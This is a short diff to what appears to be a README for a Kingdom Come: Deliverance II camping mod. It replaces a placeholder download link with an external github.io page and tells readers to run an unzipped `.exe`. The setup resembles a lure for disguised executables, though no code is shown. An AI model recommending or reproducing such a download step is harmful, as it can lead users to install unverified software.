@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file – the mod will be automatically installed into your Kingdom Come: Deliverance II mods folder.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://camping-mod-kcd2.github.io/.github/)
 
 ## 📸 Overview
 ![kcd2-camping-mod-setup](https://github.com/user-attachments/assets/e521f179-e965-4514-8bb9-4d13bad118f0)
